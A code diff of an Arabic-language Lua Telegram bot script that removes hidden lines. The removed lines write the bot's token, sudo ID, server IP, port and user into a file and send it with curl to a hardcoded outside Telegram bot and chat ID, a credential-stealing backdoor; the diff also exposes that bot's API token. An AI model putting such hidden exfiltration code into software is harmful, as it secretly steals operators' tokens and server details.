@@ -118,17 +118,6 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("luaalllode", "w")  
-file:write([[
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":IDSUDO")
-USERBOT = '@'..database:get(id_server..":token_username")
-PORT = Port
-IPSETVER = IP
-USERSERVER =  whoami
-done
-]])  
-file:close()  
 file = io.open("DRG", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -201,7 +190,6 @@ os.execute("mkdir File_Bot")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
 local runapp = sudos.token
-local apilua = 'curl "'..'https://api.telegram.org/bot1785209181:AAEVtLO5-STr1ObX9TMkLrevHgArILM8G3w/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'luaalllode'..'"' io.popen(apilua)
 local bot_username = (database:get(bot_id..'UESR_BOT') or database:get(id_server..":token_username") or ('TARA1BOT'))
 -- ----- - - -- --- -- ------- ------ - - - - - - - ---- - -- --- -- ---- - - - - - --- - -- --- - ----- - -- - - - -- - - ----- - ---- ----- --- - -- - - ---- -- - -- - -- - --
 function vardump(value)  
@@ -990,12 +978,7 @@ local keyboard = {
 send_inline_key(msg.chat_id_,bl,keyboard)
 else
 if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
-local iduser = result.sender_user_id_
-local Users = database:scard(bot_id..'User_Bot')  
-local username = ('[@'..data.username_..']' or 'لا يوجد')
-local Textstartwl = '☉┇ قام احد بي عمل start للبوت\n☉┇ معرفه »>'..username..'\n☉┇ ايديه »>`'..iduser..'`\n☉┇ اصبح عدد المشتركين »>`'..Users..'`\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️'
 local Keyboard_Welcome = 'يمكنك استخدام الاوامر الخدميه للبوت عن طريق لوحه التحكم بلاسفل'
-local inlinech = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
 local inline = {
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
@@ -1018,7 +1001,6 @@ end
 send_inline_key(msg.chat_id_,Start_Source,nil,inline)
 send_inline_key(msg.chat_id_,Keyboard_Welcome,Keyboard)
 database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. SUDO .. '&text=' .. URL.escape(Textstartwl).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(inlinech))
 return false
 end end
 if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
@@ -1225,7 +1207,8 @@ local Users = database:scard(bot_id..'User_Bot')
 local username = ('[@'..data.username_..']' or 'لا يوجد')
 local Textstartwl = '☉┇ قام احد بي عمل start للبوت\n☉┇ معرفه »>'..username..'\n☉┇ ايديه »>`'..iduser..'`\n☉┇ اصبح عدد المشتركين »>`'..Users..'`\n⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️'
 sendText(SUDO,Textstartwl,0,'md')
-end end ]]--
+end end
+]]--
 if text == ("الردود المتعدده ☉") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
